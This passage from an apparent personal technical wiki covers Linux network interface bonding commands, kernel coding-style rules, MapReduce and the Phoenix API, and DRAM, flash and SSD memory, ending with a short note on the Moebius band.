[root@real-server root]# ifenslave  bond0 eth2 eth3
[root@real-server root]# cat /proc/net/bond0/info
Bonding Mode: load balancing (round-robin)
MII Status: up
MII Polling Interval (ms): 0
Up Delay (ms): 0
Down Delay (ms): 0

Slave Interface: eth2
MII Status: up
Link Failure Count: 0

Slave Interface: eth3
MII Status: up
Link Failure Count: 0
}}}

!!High Availability mode
{{{
[root@real-server root]# modprobe bonding mode=1 miimon=100 downdelay=200 updelay=200
[root@real-server root]# ip link set dev bond0 addr 00:80:c8:e7:ab:5c
[root@real-server root]# ip addr add 192.168.100.33/24 brd + dev bond0
[root@real-server root]# ip link set dev bond0 up
[root@real-server root]# ifenslave  bond0 eth2 eth3
The interface eth2 is up, shutting it down it to enslave it.
The interface eth3 is up, shutting it down it to enslave it.
[root@real-server root]# ip link show eth2 ; ip link show eth3 ; ip link show bond0
4: eth2: &lt;BROADCAST,MULTICAST,SLAVE,UP&gt; mtu 1500 qdisc pfifo_fast master bond0 qlen 100
  link/ether 00:80:c8:e7:ab:5c brd ff:ff:ff:ff:ff:ff
5: eth3: &lt;BROADCAST,MULTICAST,NOARP,SLAVE,DEBUG,AUTOMEDIA,PORTSEL,NOTRAILERS,UP&gt; mtu 1500 qdisc pfifo_fast master bond0 qlen 100
  link/ether 00:80:c8:e7:ab:5c brd ff:ff:ff:ff:ff:ff
58: bond0: &lt;BROADCAST,MULTICAST,MASTER,UP&gt; mtu 1500 qdisc noqueue
  link/ether 00:80:c8:e7:ab:5c brd ff:ff:ff:ff:ff:ff
}}}
</pre>
</div>
<div title="Linux Distro Timeline" modifier="YourName" created="200807021144" changecount="1">
<pre>[img[images/linuxdistrotimeline.png]]</pre>
</div>
<div title="Linux Kernel Coding Standards" modifier="BhargavaKancherla" modified="200807180519" created="200807180440" changecount="25">
<pre>!Linux Kernel Coding Standards

!!!Indentation
Tabs are 8 characters, and thus indentations are also 8 characters.
{{{
/*
 * The preferred way to ease multiple indentation levels 
 * in a switch statement is
 * to align the &quot;switch&quot; and its subordinate &quot;case&quot; labels 
 * in the same column
 * instead of &quot;double-indenting&quot; the &quot;case&quot; labels.  E.g.:
 */

switch (suffix) {
case 'G':
case 'g':
	mem &lt;&lt;= 30;
	break;
case 'M':
case 'm':
	mem &lt;&lt;= 20;
	break;
case 'K':
case 'k':
	mem &lt;&lt;= 10;
	/* fall through */
default:
	break;
}
}}}

!!!Breaking long lines
{{{
void fun(int a, int b, int c)
{
	if (condition)
		printk(KERN_WARNING &quot;Warning this is a long printk with &quot;
                                            &quot;3 parameters a: %u b: %u &quot;
                                            &quot;c: %u \n&quot;, a, b, c);
	next_statement;
}
}}}

!!!Placing Braces
{{{
if (x is true) {
        we do y
}

/* functions are a special case, the brace comes in the next line */
int function(int x)
{
        body of function
}
}}}

!!!Spaces
{{{
/* 
 * So use a space after these keywords:
 *        if, switch, case, for, do, while
 * but not with sizeof, typeof, alignof, or __attribute__.  E.g.,
 *        s = sizeof(struct file);
 */

/*
 * Do not add spaces around (inside) parenthesized expressions.  This example is
 * bad:
 */
        s = sizeof( struct file );

/* 
 * When declaring pointer data or a function that returns a pointer type, the
 * preferred use of '*' is adjacent to the data name or function name and not
 * adjacent to the type name.  Examples:
 */

        char *linux_banner;
        unsigned long long memparse(char *ptr, char **retptr);
        char *match_strdup(substring_t *s);

/*
 * Use one space around (on each side of) most binary and ternary operators,
 * such as any of these:
 *
 *        =  +  -  &lt;  &gt;  *  /  %  |  &amp;  ^  &lt;=  &gt;=  ==  !=  ?  :
 *
 * but no space after unary operators:
 *        &amp;  *  +  -  ~  !  sizeof  typeof  alignof  __attribute__  defined
 *
 * no space before the postfix increment &amp; decrement unary operators:
 *        ++  --
 *
 * no space after the prefix increment &amp; decrement unary operators:
 *        ++  --
 *
 * and no space around the '.' and &quot;-&gt;&quot; structure member operators.
 */
}}}

!!!Functions
The maximum length of a function is inversely proportional to the complexity and indentation level of that function.

{{{
/* 
 * In source files, separate functions with one blank 
 * line.  If the function is exported, the EXPORT 
 * macro for it should follow immediately after the  
 * closing function brace line.  E.g.:
 */

int system_is_up(void)
{
        return system_state == SYSTEM_RUNNING;
}
EXPORT_SYMBOL(system_is_up);
}}}

!!!Function Prototypes
In function prototypes, include parameter names with their data types. Although this is not required by the C language, it is preferred in Linux because it is a simple way to add valuable information for the reader.

!!!~GOTOs for exiting
The goto statement comes in handy when a function exits from multiple locations and some common work such as cleanup has to be done.

The rationale is:
* unconditional statements are easier to understand and follow
* nesting is reduced
* errors by not updating individual exit points when making modifications are prevented
* saves the compiler work to optimize redundant code away

{{{
int fun(int a)
{
        int result = 0;
        char *buffer = kmalloc(SIZE);

        if (buffer == NULL)
                return -ENOMEM;

        if (condition1) {
                while (loop1) {
                        ...
                }
                result = 1;
                goto out;
        }
        ...
out:
        kfree(buffer);
        return result;
}
}}}

!!!Comments
The preferred style for long (multi-line) comments is:
{{{
/*
 * This is the preferred style for multi-line
 * comments in the Linux kernel source code.
 * Please use it consistently.
 *
 * Description:  A column of asterisks on the left side,
 * with beginning and ending almost-blank lines.
 */
}}}

!!!Macros

* Names of macros defining constants and labels in enums are capitalized.
{{{
#define CONSTANT 0x12345
}}}
* Enums are preferred when defining several related constants.
* CAPITALIZED macro names are appreciated but macros resembling functions
may be named in lower case.
* Generally, inline functions are preferable to macros resembling functions.
* Macros with multiple statements should be enclosed in a do - while block:

{{{
#define macrofun(a, b, c)                       \
        do {                                    \
                if (a == 5)                     \
                        do_this(b, c);          \
        } while (0)
}}}

* Things to avoid when using macros:
** macros that affect control flow is a _very_ bad idea. It looks like a function call but exits the &quot;calling&quot; function; don't break the internal parsers of those who will read the code.
{{{
#define FOO(x)                                  \
        do {                                    \
                if (blah(x) &lt; 0)                \
                        return -EBUGGERED;      \
        } while(0)
}}}
** macros that depend on having a local variable with a magic name might look like a good thing, but it's confusing as hell when one reads the code and it's prone to breakage from seemingly innocent changes.
{{{
#define FOO(val) bar(index, val)
}}}
** macros with arguments that are used as l-values: FOO(x) = y; will bite you if somebody e.g. turns FOO into an inline function.
** forgetting about precedence: macros defining constants using expressions must enclose the expression in parentheses. Beware of similar issues with macros using parameters.
{{{
#define CONSTANT 0x4000
#define CONSTEXP (CONSTANT | 3)
}}}

!!!Allocating memory
The kernel provides the following general purpose memory allocators:''kmalloc(), kzalloc(), kcalloc(), and vmalloc()''. Please refer to the API documentation for further information about them.

The preferred form for passing a size of a struct is the following:
{{{
        p = kmalloc(sizeof(*p), ...);
}}}
The alternative form where struct name is spelled out hurts readability and introduces an opportunity for a bug when the pointer variable type is changed but the corresponding sizeof that is passed to a memory allocator is not.

''Casting the return value'' which is a void pointer is ''redundant''. The conversion from void pointer to any other pointer type is guaranteed by the C programming language.

!!!inline
* Abundant use of the inline keyword leads to a much bigger kernel, which in turn slows the system as a whole down, due to a bigger icache footprint for the CPU and simply because there is less memory available for the pagecache. Just think about it; a pagecache miss causes a disk seek, which easily takes 5 miliseconds. There are a LOT of cpu cycles that can go into these 5 miliseconds.
* A reasonable rule of thumb is to not put inline at functions that have more than 3 lines of code in them.
* Often people argue that adding inline to functions that are static and used only once is always a win since there is no space tradeoff. While this is technically correct, gcc is capable of inlining these automatically without help, and the maintenance issue of removing the inline when a second user appears outweighs the potential value of the hint that tells gcc to do something it would have done anyway.

!!!Function return values
Functions can return values of many different kinds, and one of the most common are
# value indicating whether the function succeeded or failed. Such a value can be represented as an error-code ''integer'' (''-Exxx = failure, 0 = success'') 
# a succeeded ''boolean'' (''0 = failure, non-zero = success'').

If the name of a function is an action or an imperative command, the function should return an error-code integer.  If the name is a predicate, the function should return a succeeded boolean.
{{{
/*
 * For example, &quot;add work&quot; is a command, and the 
 * add_work() function returns 0 for success or -EBUSY for failure.  
 * In the same way, &quot;PCI device present&quot; is a predicate,
 * and the pci_dev_present() function returns 1 if it succeeds in
 * finding a matching device or 0 if it doesn't.
 */
}}}

!References
http://lxr.linux.no/linux/Documentation/CodingStyle
http://www.kroah.com/linux/talks/ols_2002_kernel_codingstyle_talk/html/
http://www.gnu.org/prep/standards/standards.html

</pre>
</div>
<div title="MainMenu" modifier="YourName" modified="200812051705" created="200801110955" changecount="52">
<pre>[[Secure Coding]]
[[Tips]]
[[Hack Technique Links]]
[[WEP Cloaking]]
[[Obfuscation Techniques]]
[[Intrusion Detection]]
[[Nebbetts Shuttle]]
[[Hybrid Web Worms]]
[[Interface Fuzzing]]
[[DNS Attacks]]
[[Code Injection]]
[[Before Ajaxulation]]
[[Backdoors]]
[[Armoring Techniques]]
[[SSH Ask Password]]
[[Asymmetric Routing]]
[[Debian Package]]
[[ARP Hacking]]
[[Dangling Pointer]]
[[Virtualisation]]
[[Dynamic Images]]
[[Sending Fax in Symantec]]
[[Hard Disk Recovery]]
[[Wire Instructions]]
[[Kernel Panic]]
[[Building SanFS]]
[[Vmware Bugs]]
[[Configure PXE install on SFS]]
[[Routing]]
[[NAT]]
[[Link Aggregation]]
[[ARP]]
[[iptables]]
[[ip neigh]]
[[ip link]]
[[mii-tool]]
[[ifconfig]]
[[ip addr]]
[[ip route]]
[[ip rule]]
[[nc]]
[[ping]]
[[netstat]]
[[AI]]
[[kexec reboot]]
[[Vmware Shared Disks]]
[[Linux Distro Timeline]]
[[Power Consumption of devices]]
[[sysctl variables]]
[[AppMap]]
[[Debian Packaging]]
[[.Net]]
[[Dtrace]]
[[Fermat's theorem]]
[[Fibonnaci]]
[[Hash in Shell Scripts]]
[[Map Reduce]]
[[Platonic Solids]]
[[Particle Physics]]
[[Similarity Search]]
[[Web 2.0]]
[[Wikipedia]]
[[Wine in Ubuntu]]
[[XSFT]]
[[VCS One]]
[[VxSS]]
[[XDC]]
[[Moebius Band]]
[[Linux Kernel Coding Standards]]
[[SUN ALOM shell]]
[[SSHTunneling]]
[[iSNS]]
[[Solar Energy]]
[[Memory Technologies]]
[[Ocean Energy]]
[[Tidal Energy]]
[[whois]]
[[vSAN]]
[[VxVM]]
[[VPLS]]
[[Ubuntu bugs]]
[[Teredo or IPv6 to IPv4]]
[[Resources]]
[[Help Me]]</pre>
</div>
<div title="Map Reduce" modifier="BhargavaKancherla" modified="200807151020" created="200807151015" changecount="7">
<pre>!Map Reduce
Map Reduces is developed by google as a general-purpse environment for larg-scale data processing. It is designed to use for very large data sets, and to run parallel tasks on thousands of computers in for large clusters. It allows a algorithm to be taken and division to multiple parallel data tasks which can be executed on different machines. 

Example: To count the total no of occurences of each word in the input
{{{
// input: a document
// intermediate output: keyword; value=1
Map(void *input) {
	for each word w in input
		EmitIntermediate(w,1);
}

//intermediate outupt:keyword; value=1
// output:keyword; value=occurrences
Reduce(String key, Iterator values) {
	int result = 0;
	for each v in values
		result += v;
	Emit(key, result);
}

}}}

[img[images/Map.Reduce.png]]

!Phoenix : a shared-memory implementation of ~MapReduce
* Uses threads instead of cluster nodes for parallelism
* Communicates through shared memory instead of network messages
** Works with CMP and SMP systems
* Current version works with C/C++ and uses p-threads
** Easy to port to other languages or thread evnironments

!!Pheonix API

!!! System-define functions
These are functions provided by pheonix for system related tasks.
* int pheonix_scheduler(scheduler_args_t *args) 
** This initialises the runtime system
* void emit_intermediate (void *key, void *val, int key_size)
* void emit(void *key, void *val)
** These 2 functions are used to modify the pheonix map-reduce queues. 

!!! User-defined functions
These functions are arguments to the pheonix scheduler. 
* void (*map_t) (map_args-t *args)
** Map function that needs to be applied to each input element
* void (*reduce_t) (void *key, void **buffer, int count)
** Reduce function applied on intermediate parts with the same key
* int (*key_cmp_t) (const void *key1, const void *key2)
** Function to compare two keys
* int (*splitter_t) (void *input, int size, map_args_t *args)
** Splits input data across map tasks (optional)

!!Pheonix Runtime
Pheonix runtime provides starting and stopping of threads, assigning map and reduce tasks to threads, buffer allocation and communication. It allows duynamic scheduling of tasks for load balancing, communication through pointer exchange, locality optimisation through granuality adujstment. 



</pre>
</div>
<div title="Memory Technologies" modifier="YourName" created="200811080416" changecount="1">
<pre>!Solid-state 
Solid-state electronic components, devices, and systems are based entirely on the semiconductor, such as transistors, microprocessor chips, and the bubble memory. In solid-state components, there is no use of the electrical properties of a vacuum and no mechanical action, no moving parts. In a solid-state component, the current is confined to solid elements and compounds engineered specifically to switch and amplify it. Current flows in two forms: as negatively-charged electrons, and as positively-charged electron deficiencies called electron holes or just &quot;holes&quot;. Both the electron and the hole are called charge carriers.

Examples of a non-solid-state electronic components are vacuum tubes and cathode-ray tubes (CRTs). In this device, electrons flow freely through a vacuum from an electron gun, through deflecting and focusing fields, and finally to a phosphorescent screen.

Solid-state devices are much faster and more reliable than mechanical disks and tapes, but are usually more expensive.

!SRAM and DRAM
Dynamic random access memory (DRAM) is a type of random access memory that stores each bit of data in a separate capacitor within an integrated circuit. Since real capacitors leak charge, the information eventually fades unless the capacitor charge is refreshed periodically. Because of this refresh requirement, it is a dynamic memory as opposed to SRAM and other static memory.

The advantage of DRAM is its structural simplicity: only one transistor and a capacitor are required per bit, compared to six transistors in SRAM. This allows DRAM to reach very high density.

For economic reasons, the large (main) memories found in personal computers, workstations, and non-handheld game-consoles (such as Playstation and Xbox) normally consists of dynamic RAM (DRAM). Other parts of the computer, such as cache memories and data buffers in hard disks, normally use static RAM (SRAM).

DRAM (memory) modules
* Single In-line Pin Package (SIPP)
* Single In-line Memory Module (SIMM)
* Dual In-line Memory Module (DIMM)

Common DRAM packages :
1. DIP 16-pin (DRAM chip, usually pre-FPRAM)
2. SIPP (usually FPRAM)
3. SIMM 30-pin (usually FPRAM)
4. SIMM 72-pin (so-called &quot;PS/2 SIMM&quot;, usually EDO RAM)
5. DIMM 168-pin (SDRAM)
6. DIMM 184-pin (DDR SDRAM)
7. RIMM 184-pin
8. DIMM 240-pin (DDR2 SDRAM/DDR3 SDRAM)

!!!SDRAM
SDRAM refers to synchronous dynamic random access memory, a term that is used to describe dynamic random access memory that has a synchronous interface. Traditionally, dynamic random access memory (DRAM) has an asynchronous interface which means that it responds as quickly as possible to changes in control inputs. SDRAM has a synchronous interface, meaning that it waits for a clock signal before responding to control inputs and is therefore synchronized with the computer's system bus. The clock is used to drive an internal finite state machine that pipelines incoming instructions. This allows the chip to have a more complex pattern of operation than asynchronous DRAM which does not have a synchronized interface.

Pipelining means that the chip can accept a new instruction before it has finished processing the previous one. In a pipelined write, the write command can be immediately followed by another instruction without waiting for the data to be written to the memory array. In a pipelined read, the requested data appears after a fixed number of clock pulses after the read instruction, cycles during which additional instructions can be sent. (This delay is called the latency and is an important parameter to consider when purchasing SDRAM for a computer.)

Originally simply known as &quot;SDRAM&quot;, Single Data Rate SDRAM can accept one command and transfer one word of data per clock cycle. Typical clock frequencies are 100 and 133 MHz. Chips are made with a variety of data bus sizes.

!!!SDRAM operation

A 512 megabyte (i.e., 512 MiB) SDRAM DIMM might be made of 8 or 9 SDRAM chips, each containing 512 Mbit (512 Mibit) of storage, and each one contributing 8 bits to the DIMM's 64- or 72-bit width.

A typical 512 Mbit SDRAM chip internally contains 4 independent 16 Mbyte banks. Each bank is an array of 8192 rows of 16384 bits each. A bank is either idle, active, or changing from one to the other.

An active command activates an idle bank. It takes a 2-bit bank address (BA0BA1) and a 13-bit row address (A0A12), and reads that row into the bank's array of 16384 sense amplifiers. This is also known as &quot;opening&quot; the row. This operation has the side effect of refreshing that row.

Once the row has been activated or &quot;opened&quot;, read and write commands are possible. Each command requires a column address, but because each chip works on 8 bits at a time, there are 2048 possible column addresses, needing only 11 address lines (A0A9,A11). Activation requires a minimum time, called the row-to-column delay, or tRCD. This time, rounded up to the next multiple of the clock period, specifies the minimum number of cycles between an active command, and a read or write command. During these delay cycles, arbitrary commands may be sent to other banks; they are completely independent.

When a read command is issued, the SDRAM will produce the corresponding output data on the DQ lines in time for the rising edge of the clock 2 or 3 cycles later (depending on the configured CAS latency). Subsequent words of the burst will be produced in time for subsequent rising clock edges.

A write command is accompanied by the data to be written on the DQ lines during the same rising edge. It is the duty of the memory controller to ensure that the SDRAM is not driving read data on the DQ lines at the same time that it needs to drive write data on those lines. This can be done by waiting until a read burst is not in progress, terminating the read burst, or using the DQM control line.

When the memory controller wants to access a different row, it must first return that bank's sense amplifiers to an idle state, ready to sense the next row. This is known as a &quot;precharge&quot; operation, or &quot;closing&quot; the row. A precharge may be commanded explicitly, or it may be performed automatically at the conclusion of a read or write operation. Again, there is a minimum time, the row precharge delay, tRP, which must elapse before that bank is fully idle and it may receive another active command.

Although refreshing a row is an automatic side effect of activating it, there is a minimum time for this to happen, which requires a minimum row access time tRAS, that must elapse between an active command opening a row, and the corresponding precharge command closing it. This limit is usually dwarfed by desired read and write commands to the row, so its value has little effect on typical performance.

!!!DDR SDRAM
While the access latency of DRAM is fundamentally limited by the DRAM array, DRAM has very high potential bandwidth because each internal read is actually a row of many thousands of bits. To make more of this bandwidth available to users, a Double Data Rate interface was developed. This uses the same commands, accepted once per cycle, but reads or writes two words of data per clock cycle. It achieves nearly twice the bandwidth of the preceding [single data rate] SDRAM by double pumping (transferring data on the rising and falling edges of the clock signal) without increasing the clock frequency.

With data being transferred 64 bits at a time, DDR SDRAM gives a transfer rate of (memory bus clock rate)  2 (for dual rate)  64 (number of bits transferred) / 8 (number of bits/byte). Thus with a bus frequency of 100 MHz, DDR SDRAM gives a maximum transfer rate of 1600 MB/s.

DDR SDRAM for desktop computers DIMMs have 184 pins (as opposed to 168 pins on SDRAM, or 240 pins on DDR2 SDRAM), and can be differentiated from SDRAM DIMMs by the number of notches (DDR SDRAM has one, SDRAM has two). DDR for notebook computers SO-DIMMs have 200 pins which is the same number of pins as DDR2 SO-DIMMs. These two specifications are notched very similarly and care must be taken during insertion when you are unsure of a correct match. DDR SDRAM operates at a voltage of 2.5 V, compared to 3.3 V for SDRAM. This can significantly reduce power consumption. Chips and modules with DDR-400/PC-3200 standard have a nominal voltage of 2.6 Volt.

DDR2 SDRAM is very similar to DDR SDRAM, but doubles the minimum read or write unit again, to 4 consecutive words. The bus protocol was also simplified to allow higher performance operation. (In particular, the &quot;burst terminate&quot; command is deleted.) This allows the bus rate of the SDRAM to be doubled without increasing the clock rate of internal RAM operations; instead, internal operations are performed in units 4 times as wide as SDRAM.

DDR3 continues the trend, doubling the minimum read or write unit to 8 consecutive words. This allows another doubling of bandwidth and external bus rate without having to change the clock rate of internal operations, just the width.

!Flash Memory
Flash memory is non-volatile computer memory that can be electrically erased and reprogrammed. It is a technology that is primarily used in memory cards and USB flash drives. 

It is a specific type of EEPROM (Electrically Erasable Programmable Read-Only Memory) that is erased and programmed in large blocks.

Flash memory costs far less than byte-programmable EEPROM and therefore has become the dominant technology wherever a significant amount of non-volatile, solid state storage is needed.

Flash memory is non-volatile, which means that no power is needed to maintain the information stored in the chip. In addition, flash memory offers fast read access times (although not as fast as volatile DRAM memory used for main memory in PCs) and better kinetic shock resistance than hard disks. Another feature of flash memory is that when packaged in a &quot;memory card,&quot; it is enormously durable, being able to withstand intense pressure, extremes of temperature, and even immersion in water.

Although technically a type of EEPROM, the term &quot;EEPROM&quot; is generally used to refer specifically to non-flash EEPROM which is erasable in small blocks, typically bytes. Because erase cycles are slow, the large block sizes used in flash memory erasing give it a significant speed advantage over old-style EEPROM when writing large amounts of data.

!!!Flash operation
Flash memory stores information in an array of memory cells made from floating-gate transistors. In traditional single-level cell (SLC) devices, each cell stores only one bit of information. Some newer flash memory, known as multi-level cell (MLC) devices, can store more than one bit per cell by choosing between multiple levels of electrical charge to apply to the floating gates of its cells.
A flash memory cell.

!!!Block erasure
One limitation of flash memory is that although it can be read or programmed a byte or a word at a time in a random access fashion, it must be erased a &quot;block&quot; at a time. This generally sets all bits in the block to 1. Starting with a freshly erased block, any location within that block can be programmed. However, once a bit has been set to 0, only by erasing the entire block can it be changed back to 1. In other words, flash memory (specifically NOR flash) offers random-access read and programming operations, but cannot offer arbitrary random-access rewrite or erase operations. A location can, however, be rewritten as long as the new value's 0 bits are a superset of the over-written value's. For example, a nibble value may be erased to 1111, then written as 1110. Successive writes to that nibble can change it to 1010, then 0010, and finally 0000. In practice few algorithms can take advantage of this successive write capability and in general the entire block is erased and rewritten at once.

!!!Memory Wear
Another limitation is that flash memory has a finite number of erase-write cycles. Most commercially available flash products are guaranteed to withstand around 100,000 write-erase-cycles.[citation needed] The guaranteed cycle count may apply only to block zero (as is the case with TSOP NAND parts), or to all blocks (as in NOR). This effect is partially offset in some chip firmware or file system drivers by counting the writes and dynamically remapping blocks in order to spread write operations between sectors; this technique is called wear levelling.
Another approach is to perform write verification and remapping to spare sectors in case of write failure, a technique called bad block management (BBM). For portable consumer devices, these wearout management techniques typically extend the life of the flash memory beyond the life of the device itself, and some data loss may be acceptable in these applications. For high reliability data storage, however, it is not advisable to use flash memory that has been through a large number of programming cycles. This limitation does not apply to 'read-only' applications such as thin clients and routers, which are only programmed once or at most a few times during their lifetime.

!!!Low-level access

The low-level interface to flash memory chips differs from those of other memory types such as DRAM, ROM, and EEPROM, which support bit-alterability (both zero to one and one to zero) and random-access via externally accessible address buses.

While NOR memory provides an external address bus for read and program operations (and thus supports random-access); unlocking and erasing NOR memory must proceed on a block-by-block basis. With NAND flash memory, read and programming operations must be performed page-at-a-time while unlocking and erasing must happen in block-wise fashion.

!!!!NOR memories

Reading from NOR flash is similar to reading from random-access memory, provided the address and data bus are mapped correctly. Because of this, most microprocessors can use NOR flash memory as execute in place (XIP) memory, meaning that programs stored in NOR flash can be executed directly without the need to first copy the program into RAM. NOR flash may be programmed in a random-access manner similar to reading. Programming changes bits from a logical one to a zero. Bits that are already zero are left unchanged. Erasure must happen a block at a time, and resets all the bits in the erased block back to one. Typical block sizes are 64, 128, or 256 KB.

Bad block management is a relatively new feature in NOR chips. In older NOR devices not supporting bad block management, the software or device driver controlling the memory chip must correct for blocks that wear out, or the device will cease to work reliably.

The specific commands used to lock, unlock, program, or erase NOR memories differ for each manufacturer. To avoid needing unique driver software for every device made, a special set of CFI commands allow the device to identify itself and its critical operating parameters.

Apart from being used as random-access ROM, NOR memories can also be used as storage devices by taking advantage of random-access programming. Some devices offer read-while-write functionality so that code continues to execute even while a program or erase operation is occurring in the background. For sequential data writes, NOR flash chips typically have slow write speeds compared with NAND flash.

!!!!NAND memories
NAND flash architecture was introduced by Toshiba in 1989. These memories are accessed much like block devices such as hard disks or memory cards. Each block consists of a number of pages. The pages are typically 512[6] or 2,048 or 4,096 bytes in size. Associated with each page are a few bytes (typically 1216 bytes) that should be used for storage of an error detection and correction checksum.

While reading and programming is performed on a page basis, erasure can only be performed on a block basis. Another limitation of NAND flash is data in a block can only be written sequentially.

NAND devices also require bad block management by the device driver software, or by a separate controller chip. SD cards, for example, include controller circuitry to perform bad block management and wear leveling. When a logical block is accessed by high-level software, it is mapped to a physical block by the device driver or controller. A number of blocks on the flash chip may be set aside for storing mapping tables to deal with bad blocks, or the system may simply check each block at power-up to create a bad block map in RAM. The overall memory capacity gradually shrinks as more blocks are marked as bad.

NAND is best suited to systems requiring high capacity data storage. This type of flash architecture offers higher densities and larger capacities at lower cost with faster erase, sequential write, and sequential read speeds, sacrificing the random-access and execute in place advantage of the NOR architecture.

!!!!Distinction between NOR and NAND flash
NOR and NAND flash differ in two important ways:
* the connections of the individual memory cells are different
* the interface provided for reading and writing the memory is different (NOR allows random-access for reading, NAND allows only page access)

It is important to understand that these two are linked by the design choices made in the development of NAND flash. An important goal of NAND flash development was to reduce the chip area required to implement a given capacity of flash memory, and thereby to reduce cost per bit and increase maximum chip capacity so that flash memory could compete with magnetic storage devices like hard disks.

NOR and NAND flash get their names from the structure of the interconnections between memory cells.[11] In NOR flash, cells are connected in parallel to the bit lines, allowing cells to be read and programmed individually. The parallel connection of cells resembles the parallel connection of transistors in a CMOS NOR gate. In NAND flash, cells are connected in series, resembling a NAND gate, and preventing cells from being read and programmed individually: the cells connected in series must be read in series.

When NOR flash was developed, it was envisioned as a more economical and conveniently rewritable ROM than contemporary EPROM, EAROM, and EEPROM memories. Thus random-access reading circuitry was necessary. However, it was expected that NOR flash ROM would be read much more often than written, so the write circuitry included was fairly slow and could only erase in a block-wise fashion; random-access write circuitry would add to the complexity and cost unnecessarily.

Because of the series connection and removal of wordline contacts, a large grid of NAND flash memory cells will occupy perhaps only 60% of the area of equivalent NOR cells. NAND flash's designers realized that the area of a NAND chip, and thus the cost, could be further reduced by removing the external address and data bus circuitry. Instead, external devices could communicate with NAND flash via sequential-accessed command and data registers, which would internally retrieve and output the necessary data. This design choice made random-access of NAND flash memory impossible, but the goal of NAND flash was to replace hard disks, not to replace ROMs.


!!!!Write Endurance
The write endurance of SLC Floating Gate NOR flash is typically equal or greater than that of NAND flash, while MLC NOR &amp; NAND Flash have similar Endurance capabilities. Example Endurance cycle ratings listed in datasheets for NAND and NOR Flash are provided.

* NAND Flash is typically rated at about 100K cycles (Samsung OneNAND KFW4G16Q2M)
* SLC Floating Gate NOR Flash has typical Endurance rating of 100K to 1,000K cycles (Numonyx M58BW 100K; Spansion S29CD016J 1000K)
* MLC Floating Gate NOR has typical Endurance rating of 100K cycles (Numonyx J3 Flash)

!!!!Flash file systems
Because of the particular characteristics of flash memory, it is best used with either a controller to perform wear-levelling and error correction or specifically designed file systems which spread writes over the media and deal with the long erase times of NOR flash blocks. The basic concept behind flash file systems is: When the flash store is to be updated, the file system will write a new copy of the changed data over to a fresh block, remap the file pointers, then erase the old block later when it has time.

Around 1994, the PCMCIA, an industry group, approved the Flash Translation Layer (FTL) specification, which allowed a Linear Flash device to look like a FAT disk, but still have effective wear levelling. Other commercial systems such as FlashFX and FlashFX Pro by Datalight were created to avoid patent concerns with FTL.

ZFS by Sun Microsystems has been optimized to manage Flash SSD systems, both as cache as well as main storage facilities, available for OpenSolaris, FreeBSD, and Mac OS X operating systems. Sun has announced a complete line of Flash enabled systems and storage devices.

JFFS was the first flash-specific file system for Linux, but it was quickly superseded by JFFS2, originally developed for NOR flash.

In practice, flash file systems are only used for &quot;Memory Technology Devices&quot; (&quot;MTD&quot;), which are embedded flash memories that do not have a controller. Removable flash memory cards and USB flash drives have built-in controllers to perform wear-levelling and error correction so use of a specific flash file system does not add any benefit.

!!!!Transfer rates
Commonly advertised is the maximum read speed, NAND flash memory cards are generally faster at reading than writing.

Transferring multiple small files, smaller than the chip specific block size, could lead to much lower rate.

Access latency has an influence on performance but is less of an issue than with their hard drive counterpart.

Sometimes denoted in MB/s (megabyte per second), or in number of &quot;X&quot; like 60x 100x or 150x. &quot;X&quot; speed rating makes reference to the speed at which a legacy audio CD drive would deliver data, 1x is equal to 150 kilobytes per second.

For example, a 100x memory card goes to 150 KB x 100 = 15000 KB per second = 14.65 MB per second.

!!!!Serial flash

Serial flash is a small, low-power flash memory that uses a serial interface, typically SPI, for sequential data access. When incorporated into an embedded system, serial flash requires fewer wires on the PCB than parallel flash memories, since it transmits and receives data one bit at a time. This may permit a reduction in board space, power consumption, and total system cost.

!USB flash drive
There are typically four parts to a flash drive:
* Male type-A USB connector  provides an interface to the host computer.
* USB mass storage controller  implements the USB host controller. The controller contains a small microcontroller with a small amount of on-chip ROM and RAM.
* NAND flash memory chip  stores data. NAND flash is typically also used in digital cameras.
* Crystal oscillator  produces the device's main 12 MHz clock signal and controls the device's data output through a phase-locked loop.

Some file systems are designed to distribute usage over an entire memory device without concentrating usage on any part (e.g., for a directory); this prolongs life of simple flash memory devices. USB flash drives, however, have this functionality built into the controller to prolong device life, and use of such a file system brings less advantage.

Some flash drives retain their memory after being submerged in water [19], even through a machine wash, although this is not a design feature and not to be relied upon. Leaving the flash drive out to dry completely before allowing current to run through it has been known to result in a working drive with no future problems. Channel Five's Gadget Show cooked a flash drive with propane, froze it with dry ice, submerged it in various acidic liquids, ran over it with a jeep and fired it against a wall with a mortar. A company specializing in recovering lost data from computer drives managed to recover all the data on the drive. [20] All data on the other removal storage devices tested, using optical or magnetic technologies, were destroyed.

!SSD Solid-state devices
A solid-state drive (SSD) is a data storage device that uses solid-state memory to store persistent data.

!!!Flash-based
Most SSD manufacturers use non-volatile flash memory to create more rugged and compact devices for the consumer market. These flash memory-based SSDs, also known as flash drives, do not require batteries. They are often packaged in standard disk drive form factors (1.8-inch, 2.5-inch, and 3.5-inch). In addition, non-volatility allows flash SSDs to retain memory even during sudden power outages, ensuring data persistence. Up to the fall of 2008 flash SSDs were significantly slower than DRAM (and even traditional HDDs on big files), but still perform better than traditional hard drives (at least with regard to reads) because of negligible seek time (flash SSDs have no moving parts, and thus eliminate spin-up time, and greatly reduce seek time, latency, and other delays inherent in conventional electro-mechanical disks).

Micron/Intel SSD made faster flash drives by implementing data striping (similar to RAID0) and interleaving. This allowed creation of ultra-fast SSDs with 250 MB/s effective read/write - the maximum SATA interface can really manage.[4]

!!!DRAM based
SSDs based on volatile memory such as DRAM are characterized by ultra fast data access, generally less than 0.01 milliseconds, and are used primarily to accelerate applications that would otherwise be held back by the latency of Flash SDDs or traditional HDDs. DRAM-based SSDs usually incorporate internal battery and backup storage systems to ensure data persistence while no power is being supplied to the drive from external sources. If power is lost, the battery provides power while all data is copied from random access memory (RAM) to back-up storage, or to allow the data's transfer to another computer.

These types of SSD are usually fitted with the same type of DRAM modules used in regular PC's and servers, allowing them to be swapped out and replaced with larger modules.

A secondary computer with a fast network connection can be used as a RAM-based SSD.[7]
</pre>
</div>
<div title="Moebius Band" modifier="BhargavaKancherla" modified="200807151059" created="200807151048" changecount="5">
<pre>Moebuis Band is a surface with only one side and only one boundary component. It has the mathematical property of being non-orientable. It is also a ruled surface. It was discovered independently by the German mathematicians August Ferdinand Mbius and Johann Benedict Listing in 1858.

